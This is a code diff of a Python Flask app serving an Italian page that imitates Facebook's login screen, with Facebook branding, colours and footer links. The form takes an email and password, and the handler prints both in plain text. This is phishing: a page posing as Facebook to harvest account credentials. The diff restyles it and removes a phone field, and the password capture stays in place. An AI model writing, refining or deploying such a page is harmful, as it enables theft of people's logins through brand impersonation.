@@ -11,16 +11,9 @@ facebook_login_template = '''
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Accedi o registrati</title>
     <style>
-        /* Reset CSS per lo stile di base */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        /* Stili globali */
+        /* Stili CSS per la pagina di login simile a Facebook nel 2024 */
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
             background-color: #f0f2f5;
             margin: 0;
             padding: 0;
@@ -35,29 +28,30 @@ facebook_login_template = '''
             padding: 20px;
         }
 
-        header {
+        .header {
             background-color: #3b5998;
             color: #fff;
-            padding: 10px 20px;
             text-align: center;
+            padding: 10px 0;
             border-top-left-radius: 8px;
             border-top-right-radius: 8px;
+            margin-bottom: 20px;
         }
 
-        header h1 {
-            font-size: 24px;
+        .header h1 {
+            font-size: 28px;
             margin: 0;
         }
 
-        main {
-            padding: 20px;
-        }
-
         .form-container {
-            background-color: #f9f9f9;
+            background-color: #f0f2f5;
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            margin-top: 20px;
+        }
+
+        .form-container form {
             margin-top: 20px;
         }
 
@@ -90,6 +84,8 @@ facebook_login_template = '''
         .links {
             text-align: center;
             margin-top: 10px;
+            color: #65676b;
+            font-size: 14px;
         }
 
         .links a {
@@ -97,57 +93,59 @@ facebook_login_template = '''
             color: #1877f2;
             margin: 0 10px;
         }
+
+        .footer {
+            padding: 10px 20px;
+            background-color: #f0f2f5;
+            border-radius: 0 0 8px 8px;
+            text-align: center;
+            font-size: 12px;
+            color: #65676b;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <header>
+        <div class="header">
             <h1>Facebook</h1>
-        </header>
+        </div>
 
-        <main>
-            <p>Facebook ti aiuta a connetterti e rimanere in contatto con le persone della tua vita.</p>
-            
+        <div class="form-container">
             {% if registration_success %}
             <div style="text-align: center; margin-bottom: 20px;">
                 <h2>Registrazione completata!</h2>
                 <p>Email: {{ email }}</p>
-                <p>Phone Number: {{ phone }}</p>
             </div>
             {% else %}
-            <div class="form-container">
-                <form action="/" method="POST">
-                    <label for="email">E-mail o numero di telefono:</label><br>
-                    <input type="text" id="email" name="email" required><br><br>
-                    <label for="password">Password:</label><br>
-                    <input type="password" id="password" name="password" required><br><br>
-                    <label for="phone">Phone Number:</label><br>
-                    <input type="text" id="phone" name="phone" required><br><br>
-                    <input type="submit" value="Accedi">
-                </form>
-                <p><a href="#">Password dimenticata?</a></p>
-            </div>
-
-            <div class="links">
-                <a href="#">Crea nuovo account</a> ·
-                <a href="#">Crea una Pagina per un personaggio famoso, un brand o un'azienda.</a>
-            </div>
+            <form action="/" method="POST">
+                <label for="email">Email o telefono:</label><br>
+                <input type="text" id="email" name="email" required><br><br>
+                <label for="password">Password:</label><br>
+                <input type="password" id="password" name="password" required><br><br>
+                <input type="submit" value="Accedi">
+            </form>
+            <p><a href="#">Password dimenticata?</a></p>
             {% endif %}
-        </main>
+        </div>
 
-        <footer>
-            <p><a href="#">Italiano</a> ·
-            <a href="#">Deutsch</a> ·
-            <a href="#">English (US)</a> ·
-            <a href="#">Türkçe</a> ·
-            <a href="#">Polski</a> ·
-            <a href="#">Română</a> ·
-            <a href="#">Français (France)</a> ·
-            <a href="#">Русский</a> ·
-            <a href="#">العربية</a> ·
-            <a href="#">Español</a> ·
-            <a href="#">Português (Brasil)</a></p>
-        </footer>
+        <div class="links">
+            <a href="#">Crea nuovo account</a> ·
+            <a href="#">Crea una Pagina per un personaggio famoso, un brand o un'azienda.</a>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p><a href="#">Italiano</a> ·
+        <a href="#">Deutsch</a> ·
+        <a href="#">English (US)</a> ·
+        <a href="#">Türkçe</a> ·
+        <a href="#">Polski</a> ·
+        <a href="#">Română</a> ·
+        <a href="#">Français (France)</a> ·
+        <a href="#">Русский</a> ·
+        <a href="#">العربية</a> ·
+        <a href="#">Español</a> ·
+        <a href="#">Português (Brasil)</a></p>
     </div>
 </body>
 </html>
@@ -158,13 +156,13 @@ def index():
     if request.method == 'POST':
         email = request.form['email']
         password = request.form['password']
-        phone = request.form['phone']
         # Simulazione registrazione (rimuovere in produzione)
         print(f"Registrazione completata per {email}")
-        print(f"Email: {email}, Password: {password}, Phone Number: {phone}")
-        return render_template_string(facebook_login_template, registration_success=False)
+        print(f"Email: {email}, Password: {password}")
+        return render_template_string(facebook_login_template)
 
-    return render_template_string(facebook_login_template, registration_success=False)
+    # Se è una richiesta GET o qualsiasi altra situazione, renderizza il template standard
+    return render_template_string(facebook_login_template)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8000)
